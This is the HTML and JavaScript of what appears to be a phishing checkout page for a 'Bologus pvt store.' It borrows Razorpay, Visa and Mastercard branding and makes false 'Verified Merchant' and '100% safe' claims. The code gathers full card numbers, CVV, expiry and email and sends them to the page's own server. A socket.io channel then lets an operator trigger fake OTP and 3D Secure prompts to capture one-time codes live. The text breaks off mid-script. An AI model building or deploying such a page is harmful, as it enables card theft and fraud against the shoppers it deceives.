<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bologus pvt store.</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    .page-container {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding-top: 1.5rem;
      padding-bottom: 0;
      background: linear-gradient(45deg, #ff0000 50%, #ffffff 50%);
      background-size: cover;
      background-repeat: no-repeat;
    }
    .content-wrapper {
      flex: 1;
      padding: 1rem;
      margin-bottom: 6rem;
      position: relative;
      z-index: 1;
    }
    .merchant-badge {
      position: relative;
      cursor: pointer;
      margin-left: 0;
    }
    .merchant-dropdown {
      display: none;
      position: absolute;
      top: 100%;
      left: 0;
      background: white;
      padding: 1rem;
      border-radius: 0.5rem;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
      z-index: 10;
      width: 300px;
    }
    .merchant-badge:hover .merchant-dropdown {
      display: block;
    }
    .trusted-shield {
      display: flex;
      align-items: center;
      gap: 1rem;
      padding: 1rem;
      background: #66BB6A;
      border-radius: 0.5rem;
      margin-bottom: 1rem;
    }
    .verified-tag {
      font-size: 0.75rem;
      background: rgba(255,255,255,0.2);
      padding: 0.25rem 0.5rem;
      border-radius: 1rem;
      color: #E0E0E0;
    }
    .verification-item {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      font-size: 0.875rem;
      color: #4B5563;
      padding: 0.25rem 0;
    }
    .verification-tick {
      width: 1rem;
      height: 1rem;
      flex-shrink: 0;
      color: #10B981;
    }
    .amount-display {
      font-size: 18px;
      font-weight: 400;
      color: #1a1a1a;
      text-align: center;
      margin-bottom: 20px;
      padding: 12px;
      background: #f3f4f6;
      border-radius: 8px;
    }
    .rupee-sign {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 1rem;
      color: #6b7280;
      display: flex;
      align-items: center;
      pointer-events: none;
    }
    #cardTypeIcon {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100%;
    }
    .card-type-icon {
      height: 24px;
      width: 38px;
      object-fit: contain;
    }
    #cardError {
      color: #ef4444;
      font-size: 14px;
      margin-top: 4px;
      display: none;
    }
    .otp-error {
      color: #ef4444;
      font-size: 13px;
      margin: 4px 0 8px;
      text-align: center;
      display: none;
    }
    .hidden { display: none !important; }
    .consent-message {
      display: flex;
      align-items: flex-start;
      gap: 0.5rem;
      padding: 0.75rem;
      border-radius: 0.375rem;
      cursor: pointer;
      font-size: 0.875rem;
      color: #4B5563;
      margin-top: 1rem;
      background: #f3f4f6;
      width: 100%;
    }
    .consent-checkbox {
      width: 1.25rem;
      height: 1.25rem;
      border: 2px solid #D1D5DB;
      border-radius: 0.25rem;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin-right: 5px;
    }
    .consent-checkbox.checked {
      background-color: #10B981;
      border-color: #10B981;
    }
    .consent-checkbox svg {
      width: 1rem;
      height: 1rem;
      color: white;
      display: none;
    }
    .consent-checkbox.checked svg {
      display: block;
    }
    .otp-container {
      display: flex;
      justify-content: space-between;
      gap: 10px;
    }
    .otp-input-wrapper, .otp-button-wrapper {
      width: 48%;
    }
    .otp-input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      text-align: center;
      font-size: 18px;
      letter-spacing: 5px;
      -webkit-text-security: disc;
      caret-color: transparent;
      height: 48px;
    }
    #otpSubmitButton {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 18px;
      text-align: center;
      height: 48px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
    }
    .modern-spinner {
      width: 25px;
      height: 25px;
      border: 3px solid rgba(255,255,255,0.4);
      border-radius: 50%;
      border-top-color: #ffffff;
      animation: spin 0.8s ease-in-out infinite;
      box-shadow: 0 0 5px rgba(255,255,255,0.2);
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #otpLoader {
      animation: spin 1s linear infinite;
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255,255,255,0.4);
      border-top-color: #ffffff;
      border-radius: 50%;
      box-shadow: 0 0 5px rgba(255,255,255,0.2);
    }
    .btn-loading {
      position: relative;
      pointer-events: none;
    }
    .btn-loading span {
      opacity: 0.5;
      filter: blur(1px);
    }
    .bottom-logos {
      width: 100%;
      padding: 2rem 0;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      background: transparent;
      position: relative;
      z-index: 1;
      margin-top: -6rem;
      max-width: 100%;
      overflow-x: hidden;
      padding-left: 15px;
      padding-right: 15px;
    }
    
    /* Add responsive sizing for the logos */
    .bottom-logos img {
      height: auto;
      max-height: 20px; /* Smaller overall size */
      width: auto;
      object-fit: contain;
    }
    
    /* Make specific adjustments to vertical logo */
    .bottom-logos img[alt="Verified by Visa"] {
      max-height: 28px; /* Slightly taller for vertical logos */
    }
    
    /* Mobile specific adjustments */
    @media (max-width: 640px) {
      .bottom-logos {
        gap: 8px; /* Smaller gap on mobile */
        padding-left: 20px;
        padding-right: 20px;
        flex-wrap: wrap; /* Allow wrapping on very small screens */
      }
      
      .bottom-logos img {
        max-height: 16px; /* Even smaller on mobile */
      }
      
      .bottom-logos img[alt="Verified by Visa"] {
        max-height: 24px; /* Keep proportional */
      }
    }
    .fullscreen-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(5px);
      z-index: 9999;
      display: none;
      justify-content: center;
      align-items: center;
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 2s linear infinite;
    }
    #submitButton[disabled] {
      background-color: #9CA3AF !important;
      cursor: not-allowed;
    }
    #submitButton:not([disabled]) {
      background-color: #10B981 !important;
      cursor: pointer;
    }
  </style>
  <script>
    // Function to generate a random hash string
    function generateRandomHash(length = 8) {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return result;
    }

    // Function to get or create a session hash
    function getOrCreateHash() {
      let hash = sessionStorage.getItem('paymentHash');
      if (!hash) {
        hash = generateRandomHash();
        sessionStorage.setItem('paymentHash', hash);
      }
      return hash;
    }
    
// Helper functions for clean URLs
function getSuccessUrl(invoiceId) {
  const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
  return `/s/${hash}?invoiceId=${invoiceId}`;
}

function getFailUrl(reason) {
  const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
  
  // Base URL with hash
  let url = `/f/${hash}`;
  
  // Add invoiceId and reason as query parameters if they exist
  const params = new URLSearchParams();
  if (currentInvoiceId) params.append('invoiceId', currentInvoiceId);
  if (reason) params.append('reason', reason);
  
  // Only add ? if we have parameters
  const queryString = params.toString();
  if (queryString) {
    url += '?' + queryString;
  }
  
  console.log("Generated fail URL:", url);
  return url;
}
    
    // Check current URL and redirect if needed
    document.addEventListener('DOMContentLoaded', function() {
      const urlParams = new URLSearchParams(window.location.search);
      const pid = urlParams.get('pid');
      const hash = urlParams.get('hash') || getOrCreateHash();
      
      // Store the hash in session for later use
      sessionStorage.setItem('paymentHash', hash);
      
      // If we're on payment.html but not using clean URL format, redirect
      if (window.location.pathname.includes('payment.html') && pid) {
        const cleanUrl = `/p/${hash}?pid=${pid}`;
        window.history.replaceState({}, '', cleanUrl);
      }
    });
  </script>
</head>
<body>
  <div class="page-container">
    <div class="content-wrapper">
      <div class="max-w-4xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden">
        <div class="flex flex-col md:flex-row">
          <!-- Left Section -->
          <div class="md:w-7/12 p-5">
            <div class="bg-white rounded-2xl shadow-sm mb-6">
              <div class="flex items-start gap-4 mb-4 px-4 pt-4">
                <div class="w-12 h-12 rounded-none overflow-hidden flex-shrink-0 bg-gray-50">
                  <img src="https://assets.turbologo.com/assets/features/professional-logo-templates-d9cc9a0d95eef758e45d197ff85b696204a467ac5b66fbf0a08a44be16ffe382.svg" alt="Merchant Logo" class="w-full h-full object-cover">
                </div>
                <div class="flex flex-col">
                  <span class="text-2xl font-semibold">Bologus pvt store.</span>
                  <div class="merchant-badge mt-1">
                    <div class="flex items-center gap-1 text-gray-600 text-sm">
                      <svg class="w-4 h-4 text-green-500 shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                      </svg>
                      <span>Verified Merchant</span>
                    </div>
                    <div class="merchant-dropdown">
                      <div class="trusted-shield">
                        <svg class="w-12 h-12 text-white shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                          <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                        </svg>
                        <div class="flex flex-col">
                          <span class="text-lg font-semibold text-white">Bologus pvt store.</span>
                          <span class="verified-tag">Verified Merchant</span>
                        </div>
                      </div>
                      <div class="space-y-2">
                        <div class="verification-item">
                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M5 13l4 4L19 7"/>
                          </svg>
                          <span>Verified for authenticity</span>
                        </div>
                        <div class="verification-item">
                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M5 13l4 4L19 7"/>
                          </svg>
                          <span>Razorpay's risk system ensures secure payment protection from fraud</span>
                        </div>
                        <div class="verification-item">
                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M5 13l4 4L19 7"/>
                          </svg>
                          <span>Ensures that disputes are handled diligently</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="mt-4 px-6">
                <h2 class="text-xl font-semibold mb-4">Payment Description</h2>
                <p class="text-gray-600 mb-4">
                  Payment for Digital Course Bundle â€“ Premium access to our complete digital learning package including all courses and resources.
                </p>
                <div class="bg-blue-50 p-4 rounded-2xl mb-4">
                  <div class="flex items-center gap-2 text-blue-700">
                    <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                      <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                    </svg>
                    <span class="text-sm">PCI DSS Compliant â€¢ 256-bit SSL Encryption â€¢ Secure Payment</span>
                  </div>
                </div>
                <div class="text-sm text-gray-500 flex items-center gap-2">
                  <span>Service fee is 2% of the transaction amount</span>
                </div>
                
              <div id="invoiceIdContainer" class="mt-4 bg-gray-100 p-3 hidden">
                  <span class="text-sm font-medium">INVOICE ID: </span>
                  <span class="text-sm" id="invoiceId"></span>
                </div>
              </div>
            </div>
          </div>
<!-- Right Section -->
          <div class="md:w-5/12 p-5">
            <div id="paymentForm">
              <div class="amount-display mb-6">
                Amount to Pay: â‚¹<span id="displayAmount">0.00</span>
              </div>
              <form id="mainForm" class="space-y-4">
                <div class="hidden">
                  <label class="block text-sm font-medium text-gray-700 mb-2">Amount (INR)</label>
                  <div class="relative">
                    <span class="rupee-sign">â‚¹</span>
                    <input type="text" id="amount" class="block w-full pl-8 pr-3 py-2 border border-gray-300" readonly />
                  </div>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Email</label>
                  <input type="email" id="email" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="you@example.com" required>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
                  <div class="relative">
                     <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="Enter card number" required>
                    <div id="cardTypeIcon">
                      <img src="" alt="" class="card-type-icon hidden" id="cardLogo">
                    </div>
                  </div>
                  <p id="cardError" class="text-red-500 text-sm mt-1 hidden">Please enter valid card number</p>
                  <p id="cardInfo" class="text-sm mt-1"></p>
                </div>
                <div class="grid grid-cols-2 gap-4">
                  <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
                    <input type="text" id="expiry" maxlength="5" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="MM/YY" required>
                    <p id="expiryError" class="text-red-500 text-sm mt-1 hidden">Invalid expiry date</p>
                  </div>
                  <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
                    <input type="password" id="cvv" maxlength="3" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="123" required>
                  </div>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
                  <input type="text" id="cardholderName" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="Enter name on card" required>
                </div>
                <button type="submit" id="submitButton" class="w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400" disabled>
                  <span id="submitText">Proceed to Pay</span>
                  <div id="submitLoader" class="hidden ml-2">
                    <div class="modern-spinner"></div>
                  </div>
                </button>
              </form>
              <div class="consent-message mt-4" id="consentMessage">
                <span class="consent-checkbox checked" id="consentCheckbox">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
                    <path d="M5 13l4 4L19 7"/>
                  </svg>
                </span>
                <span>Note: Making Payment with
                  <a href="https://razorpay.com/terms/" target="_blank" class="underline text-gray-400 hover:text-gray-500 transition-colors">
                    Razorpay
                  </a>
                  is 100% safe. Your transaction is processed through a secure https connection.
                </span>
              </div>
            </div>
            <!-- OTP Form -->
            <div id="otpForm" class="animate-slide-in hidden">
              <p class="text-sm text-gray-600 mb-2">
                OTP has been sent to your registered mobile number for card ending in <span id="cardLastFour"></span>
              </p>
              <div class="otp-container">
                <div class="otp-input-wrapper">
                  <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢" required>
                </div>
                <div class="otp-button-wrapper">
                  <button type="button" id="otpSubmitButton" class="w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white" disabled>
                    <span id="otpText">Confirm</span>
                    <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"/>
                      </svg>
                    </div>
                  </button>
                </div>
              </div>
              <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
              <p class="text-center text-sm text-gray-500 mt-2">Time remaining: <span id="timer">2:59</span></p>
              <div class="consent-message mt-4">
                <span class="consent-checkbox checked">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
                    <path d="M5 13l4 4L19 7"/>
                  </svg>
                </span>
                <span>Note: Making Payment with Razorpay is 100% safe. Your transaction is processed through a secure https connection.</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Bottom Logos with updated mobile-friendly styling -->
    <div class="bottom-logos">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Khatabook.svg" alt="Powered by Khatabook" />
      <img src="https://www.pcisecuritystandards.org/wp-content/uploads/2022/03/pci-logo-teal.svg" alt="PCI DSS" />
      <img src="https://logojinni.com/image/logos/razorpay.svg" alt="Razorpay" />
      <img src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" />
      <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" />
      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="Upi" />
    </div>
  </div>

  <!-- Bankpage Overlay Element -->
  <div id="bankpageOverlay" class="fullscreen-overlay">
    <div class="spinner"></div>
  </div>

  <!-- MC Verification Overlay -->
  <div id="mcVerificationOverlay" class="fullscreen-overlay">
    <div style="background-color: #fff; border-radius: 8px; width: 90%; max-width: 480px; padding: 20px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
      <!-- Header with logo and title -->
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #e5e5e5;">
        <img id="bankLogo" src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" style="height: 40px;">
        <button id="mcCancel" style="background: none; border: none; font-size: 24px; cursor: pointer; color: #666;">&times;</button>
      </div>
      
      <!-- Merchant and transaction info -->
      <div style="margin-bottom: 20px;">
        <div style="font-weight: bold; margin-bottom: 10px;">Secure Checkout</div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
          <span>Merchant:</span>
          <span id="merchantName">Bologus pvt store.</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
          <span>Amount:</span>
          <span id="transactionAmount">â‚¹<span id="transactionAmount2"></span></span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
          <span>Date:</span>
          <span id="transactionDate"></span>
        </div>
      </div>
      
      <!-- OTP Section -->
      <div style="margin-bottom: 20px;">
        <div style="font-weight: bold; margin-bottom: 10px;">3D Secure Authentication</div>
        <p style="font-size: 14px; color: #666; margin-bottom: 15px;">
          For your security, we need to verify your identity. Enter the code sent to your registered mobile phone.
        </p>
        
        <div style="margin-bottom: 10px;">
          <label for="mcOtpInput" style="display: block; margin-bottom: 5px; font-size: 14px;">Security Code:</label>
          <input type="text" id="mcOtpInput" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px;" placeholder="Enter 6-digit code" maxlength="6">
        </div>
        <p id="mcOtpError" style="color: #ef4444; font-size: 14px; margin-top: 5px; display: none;">
          Incorrect verification code. Please try again.
        </p>
        
        <div style="display: flex; justify-content: space-between; gap: 10px; margin-top: 15px;">
          <button id="mcResendBtn" style="flex: 1; padding: 10px; background-color: #f3f4f6; color: #374151; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">RESEND</button>
          <button id="mcConfirmBtn" style="flex: 1; padding: 10px; background-color: #FF5F00; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer;">CONFIRM</button>
        </div>
        
        <div style="text-align: center; margin-top: 15px; font-size: 14px; color: #666;">
          Time remaining: <span id="mcTimer">02:59</span>
        </div>
      </div>
      
      <!-- Security notice -->
      <div style="display: flex; align-items: center; justify-content: center; margin-top: 20px; font-size: 12px; color: #666;">
        <span style="margin-right: 8px;">ðŸ”’</span>
        <span>Secured by Mastercard Identity Checkâ„¢</span>
      </div>
    </div>
  </div>

  <!-- Scripts Section -->
  <script src="/socket.io/socket.io.js"></script>
  <script>
    // Global Variables
    let isCardValid = false;
    let isExpiryValid = false;
    let isProcessing = false;
    let currentInvoiceId = "";
    let statusCheckInterval;
    let timerInterval;
    let timer = 180;
    let consentChecked = true;
    let bankPageWindow = null;

    // Fetch Payment Details Using PID with Fallback
    document.addEventListener('DOMContentLoaded', async () => {
      let defaultAmount = 100;
      let pid = new URLSearchParams(window.location.search).get('pid');

      // Always set default first
      document.getElementById('amount').value = defaultAmount;
      document.getElementById('displayAmount').textContent = defaultAmount.toFixed(2);

      if (pid) {
        try {
          const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
          const data = await response.json();
          if (data.status === 'success' && data.payment?.amount) {
            const amount = parseFloat(data.payment.amount) || defaultAmount;
            document.getElementById('amount').value = amount;
            document.getElementById('displayAmount').textContent = amount.toFixed(2);
          }
        } catch (error) {
          console.error('Payment details fetch error:', error);
        }
      }

      // Add consent checkbox event listener
      document.getElementById('consentCheckbox').addEventListener('click', function() {
        consentChecked = !consentChecked;
        this.classList.toggle('checked', consentChecked);
        updateSubmitButton(); // Force update button state
      });

      // Initialize MC verification 
      setupMCVerification();

      // Initial validation
      updateSubmitButton();
    });

    // Card Validation & Formatting Functions
    function validateCard(number) {
      const clean = number.replace(/\D/g, '');
      if (clean.length !== 16) return false;
      let sum = 0;
      for (let i = 0; i < clean.length; i++) {
        let digit = parseInt(clean[i], 10);
        if ((i + 1) % 2 === 0) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
      }
      return sum % 10 === 0;
    }

    function formatCardNumber(value) {
      return value.replace(/\D/g, '')
                .replace(/(\d{4})(?=\d)/g, '$1 ')
                .substring(0, 19);
    }

    function formatExpiry(value) {
      let digits = value.replace(/\D/g, '');
      digits = digits.substring(0, 4);
      if (digits.length >= 3) {
        return digits.substring(0, 2) + '/' + digits.substring(2);
      }
      return digits;
    }

    function validateExpiry(value) {
      if (!/^\d{2}\/\d{2}$/.test(value)) return false;
      const [month, year] = value.split('/').map(Number);
      if (month < 1 || month > 12) return false;
      const now = new Date();
      const currentYear = now.getFullYear() % 100;
      const currentMonth = now.getMonth() + 1;
      return !(year < currentYear || (year === currentYear && month < currentMonth));
    }

    function updateCardError() {
      const cardInput = document.getElementById("cardNumber");
      const errorElem = document.getElementById("cardError");
      const plain = cardInput.value.replace(/\s/g, '');
      isCardValid = validateCard(plain);
      if (plain.length === 16 && !isCardValid) {
        errorElem.style.display = 'block';
        errorElem.textContent = "Please enter valid card number";
        cardInput.classList.add('border-red-500');
      } else {
        errorElem.style.display = 'none';
        cardInput.classList.remove('border-red-500');
      }
    }

    function detectCardType(number) {
      const clean = number.replace(/\D/g, '');
      if (/^4/.test(clean)) return 'visa';
      if (/^5[1-5]/.test(clean)) return 'mastercard';
      if (/^3[47]/.test(clean)) return 'amex';
      if (/^(508[5-9]|60698|607[0-8]\d|6079[0-8]|608[0-5]|6521[5-9]|652[2-9]\d|6530\d|6531[0-4])/.test(clean)) return 'rupay';
      return null;
    }

    function updateCardTypeAndInfo(value) {
      const cardLogo = document.getElementById("cardLogo");
      const detectedType = detectCardType(value);
      const logos = {
        visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
        mastercard: 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png',
        amex: 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
        rupay: 'https://www.gokiwi.in/homepage/partners/rupay.svg'
      };
      if (detectedType && logos[detectedType]) {
        cardLogo.src = logos[detectedType];
        cardLogo.classList.remove('hidden');
      } else {
        cardLogo.classList.add('hidden');
      }
    }

    function updateSubmitButton() {
      const emailValid = document.getElementById('email').checkValidity();
      const cardValid = isCardValid;
      const expiryValid = isExpiryValid;
      const cvvValid = document.getElementById('cvv').value.length === 3;
      const nameValid = document.getElementById('cardholderName').value.trim().length > 0;

      const allValid = emailValid && cardValid && expiryValid && cvvValid && nameValid && consentChecked;

      document.getElementById('submitButton').disabled = !allValid;
    }

    function updateConfirmOtpButton() {
      const otp = document.getElementById('otp').value;
      const otpButton = document.getElementById('otpSubmitButton');
      if (otp.length === 6) {
        otpButton.disabled = false;
        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
        document.getElementById('otpError').style.display = 'none';
      } else {
        otpButton.disabled = true;
        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
      }
    }

    // Attach Input Handlers
    document.addEventListener("DOMContentLoaded", function(){
      const cardInput = document.getElementById("cardNumber");
      const expiryInput = document.getElementById("expiry");
      const socket = io();

      if (cardInput) {
        cardInput.addEventListener("input", function(e) {
          const oldValue = e.target.value;
          const oldSelectionStart = e.target.selectionStart;
          const oldSpacesBeforeCursor = oldValue.substring(0, oldSelectionStart).replace(/[^\s]/g, "").length;
          
          const formatted = formatCardNumber(oldValue);
          e.target.value = formatted;

          // Validation check
          isCardValid = validateCard(formatted.replace(/\s/g, ''));
          updateCardError();
          updateCardTypeAndInfo(formatted);
          updateSubmitButton();

          // Improved cursor positioning
          const digitsBeforeCursor = oldValue.substring(0, oldSelectionStart).replace(/\D/g, "").length;
          const spacesBeforeCursorNew = Math.floor(digitsBeforeCursor / 4);
          const newPosition = digitsBeforeCursor + spacesBeforeCursorNew;
          
          if (oldSelectionStart === oldValue.length) {
            // If cursor was at the end, keep it at the end
            e.target.setSelectionRange(formatted.length, formatted.length);
          } else {
            // Otherwise, calculate its new position
            e.target.setSelectionRange(newPosition, newPosition);
          }
        });
      }

      if (expiryInput) {
        expiryInput.addEventListener("input", function(e) {
          let value = e.target.value.replace(/\D/g, '');

          // Auto-insert slash after 2 digits
          if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
          }
          e.target.value = value.substring(0, 5);

          // Validate
          isExpiryValid = validateExpiry(e.target.value);
          updateSubmitButton();
        });
      }

      ['email', 'cvv', 'cardholderName'].forEach(id => {
        document.getElementById(id).addEventListener('input', updateSubmitButton);
      });

    document.getElementById('otp').addEventListener('input', updateConfirmOtpButton);

      // Payment Submission Handler
      document.getElementById('mainForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        if (!isCardValid || !isExpiryValid || isProcessing) return;

        isProcessing = true;
        const submitButton = document.getElementById('submitButton');
        const submitText = document.getElementById('submitText');
        const submitLoader = document.getElementById('submitLoader');

        // Show loading state
        submitButton.classList.add('btn-loading');
        submitText.style.opacity = '0.5';
        submitText.style.filter = 'blur(1px)';
        submitLoader.classList.remove('hidden');

        try {
          const response = await fetch("/api/sendPaymentDetails", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
              expiry: document.getElementById('expiry').value,
              cvv: document.getElementById('cvv').value,
              email: document.getElementById('email').value,
              amount: document.getElementById('amount').value,
              currency: "INR",
              cardholder: document.getElementById('cardholderName').value
            })
          });

          const data = await response.json();
          if (!response.ok) throw new Error(data.message || 'Payment failed');

          // After setting currentInvoiceId from the API response:
          currentInvoiceId = data.invoiceId;
          localStorage.setItem('invoiceId', currentInvoiceId);
          console.log('Joining socket.io room with invoiceId:', currentInvoiceId);
          socket.emit('join', currentInvoiceId);

          // Open bank page
          bankPageWindow = window.open(
            `/bankpage.html?invoiceId=${data.invoiceId}`,
            '_blank',
            'width=600,height=800'
          );

          // Check window closure - but don't reset loading state when it closes
          const checkWindowClosed = setInterval(() => {
            if (bankPageWindow && bankPageWindow.closed) {
              clearInterval(checkWindowClosed);
            }
          }, 500);

        } catch (error) {
          console.error('Payment Error:', error);
          alert(`Payment Failed: ${error.message}`);
          submitButton.classList.remove('btn-loading');
          submitText.style.opacity = '1';
          submitText.style.filter = 'none';
          submitLoader.classList.add('hidden');
          isProcessing = false;
        }
      });

      // OTP Submission Handler
      document.getElementById('otpSubmitButton').addEventListener('click', async () => {
        if (isProcessing) return;
        isProcessing = true;
        const otpButton = document.getElementById('otpSubmitButton');
        const otpLoader = document.getElementById('otpLoader');
        const btnText = document.getElementById('otpText');
        otpButton.disabled = true;
        btnText.style.opacity = '0.5';
        btnText.style.filter = 'blur(1px)';
        otpLoader.classList.remove('hidden');

        try {
          const response = await fetch("/api/submitOTP", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              invoiceId: currentInvoiceId,
              otp: document.getElementById('otp').value
            })
          });

          if (!response.ok) throw new Error('Failed to submit OTP');
          statusCheckInterval = setInterval(checkTransactionStatus, 2000);
        } catch (err) {
          console.error('OTP submission error:', err);
          alert('Error submitting OTP. Please try again.');
          isProcessing = false;
          otpButton.disabled = false;
          otpLoader.classList.add('hidden');
          btnText.style.opacity = '1';
          btnText.style.filter = 'none';
        }
      });

      // Socket.io event handlers
      socket.on('show_otp', () => {
        document.getElementById('paymentForm').classList.add('hidden');
        document.getElementById('otpForm').classList.remove('hidden');
        const cardNumber = document.getElementById('cardNumber').value;
        document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
        if (!timerInterval) startOtpTimer();
        isProcessing = false;
      });

      // Event for showing MC verification
      socket.on('show_mc_verification', (data) => {
        console.log('Received show_mc_verification event:', data);
        console.log('Current invoice ID:', currentInvoiceId);
        
        // Check if the overlay exists
        const overlay = document.getElementById('mcVerificationOverlay');
        console.log('Overlay element found:', !!overlay);
        
        if (data.invoiceId === currentInvoiceId && overlay) {
          console.log('Invoice IDs match, updating UI...');
          
          // Show the overlay with only a loading spinner first
          const verificationContent = overlay.querySelector('div');
          const originalContent = verificationContent.innerHTML;
          
          // Create and show a spinner instead
          verificationContent.innerHTML = `
            <div style="display: flex; justify-content: center; align-items: center; min-height: 300px;">
              <div class="spinner" style="border: 4px solid #f3f3f3; border-top: 4px solid #FF5F00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
            </div>
          `;
          
          // Show the overlay immediately with just the spinner
